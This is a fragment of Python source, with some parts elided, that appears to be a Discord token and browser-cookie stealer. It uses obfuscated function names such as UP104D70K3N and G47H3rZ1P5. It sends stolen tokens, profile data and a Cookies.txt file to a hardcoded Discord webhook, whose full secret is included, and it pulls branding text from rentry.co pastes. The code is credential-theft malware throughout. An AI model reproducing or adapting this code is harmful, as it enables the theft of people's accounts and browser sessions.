...
cname = "https://rentry.co/m9pg2/raw"
cnameresp = requests.get(cname)
cname = cnameresp.text

footerc = "https://rentry.co/58959/raw"
...
h00k = "https://discord.com/api/webhooks/1160505364052181063/QBa4HeGY5FQCTHypZzOsnoIy-ZLVqre7HoT_jOf-hhG4rRreo3hJg7aUIFf8w33fv9yL"
...
def UP104D70K3N(token, path):
    ...
    if pfp == None: 
        pfp = "https://pfps.gg/assets/pfps/6779-trollface-suit.png"
    else:
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": f"{footerc}",
                "icon_url": "https://cdn.discordapp.com/attachments/1159138608884764702/1160510590599569478/lenus.png?ex=6534ecb6&is=652277b6&hm=935cf0b404a461731e862e8a0709860050408a222e7359ecfb74974eec7c8185&"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://pfps.gg/assets/pfps/6779-trollface-suit.png",
        "username": f"{cname}",
        "attachments": []
        }
            ...
            "embeds": [
                {
                    ...
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:browser:1095742866518716566> • **{C00K1C0UNt}** Cookies Found • [{cname}Cookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": f"{footerc}",
                        "icon_url": "https://cdn.discordapp.com/attachments/1159138608884764702/1160510590599569478/lenus.png?ex=6534ecb6&is=652277b6&hm=935cf0b404a461731e862e8a0709860050408a222e7359ecfb74974eec7c8185&"
...
def G47H3rZ1P5(paths1, paths2, paths3):
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": f"{footerc}",
                "icon_url": "https://pfps.gg/assets/pfps/6779-trollface-suit.png"
            }
            }
        ],
        "username": f"{cname}",
